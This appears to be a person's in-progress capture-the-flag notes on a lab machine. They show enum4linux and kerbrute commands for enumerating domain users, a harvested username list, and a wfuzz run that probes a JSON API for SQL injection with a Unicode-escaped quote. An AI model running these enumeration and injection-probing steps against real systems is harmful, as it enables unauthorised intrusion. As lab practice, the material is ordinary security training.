
```
enum4linux -a 10.10.10.179
```

```
Domain Name: MEGACORP                                                         
Domain Sid: S-1-5-21-3167813660-1240564177-918740779
```


So after adding the IP in the host file got this 
![[Pasted image 20240919042226.png]]


```
kerbrute userenum -d MEGACORP.LOCAL --dc 10.10.10.179 userlist.txt -t 100
```


```
andrew@MEGACORP.LOCAL
james@MEGACORP.LOCAL
Andrew@MEGACORP.LOCAL
dai@MEGACORP.LOCAL
administrator@MEGACORP.LOCAL
alice@MEGACORP.LOCAL
ANDREW@MEGACORP.LOCAL
lana@MEGACORP.LOCAL
Administrator@MEGACORP.LOCAL
rmartin@MEGACORP.LOCAL
pmartin@MEGACORP.LOCAL
```


So we have the users will try the login page now
```
andrew
james
dai
administrator
alice
ANDREW
lana
Administrator
rmartin
pmartin
```


So the login page is a dead end but when i pressed entered in colleague finder look what we got a list of valid users
![[Pasted image 20240919153405.png]]

```
sbauer@megacorp.htb
okent@megacorp.htb
ckane@megacorp.htb
kpage@megacorp.htb
shayna@megacorp.htb
james@megacorp.htb
cyork@megacorp.htb
rmartin@megacorp.htb
zac@magacorp.htb
jorden@megacorp.htb
alyx@megacorp.htb
ilee@megacorp.htb
nbourne@megacorp.htb
zpowers@megacorp.htb
aldom@megacorp.htb
minato@megacorp.htb
egre55@megacorp.htb
```

2024/09/19 15:37:38 >  Done! Tested 17 usernames (14 valid) in 0.816 seconds

```
sbauer@megacorp.htb
okent@megacorp.htb
ckane@megacorp.htb
kpage@megacorp.htb
james@megacorp.htb
cyork@megacorp.htb
rmartin@megacorp.htb
zac@magacorp.htb
jorden@megacorp.htb
alyx@megacorp.htb
ilee@megacorp.htb
nbourne@megacorp.htb
zpowers@megacorp.htb
aldom@megacorp.htb
```

So now i think we can run the sql injection in this as it reminds me of DVWA 

So we technically have 5 fields
![[Pasted image 20240919160202.png]]

```
"id":1,
"name":"Sarina Bauer",
"position":"Junior Developer",
"email":"sbauer@megacorp.htb",
"src":"sbauer.jpg"
```


Let's automate the process and see which payload works and which is not 
```
wfuzz -c -u http://10.10.10.179/api/getColleagues -w /usr/share/seclists/SecLists-master/Fuzzing/special-chars.txt -d '{"name":"FUZZ"}' -H 'Content-Type: application/json;charset=utf-8'
```

![[Pasted image 20240919183727.png]]


So will try ' and it's value is 
```
\u27
```
and guess what we got an error

![[Pasted image 20240919184156.png]]

```
\u0027
```
![[Pasted image 20240919184507.png]]

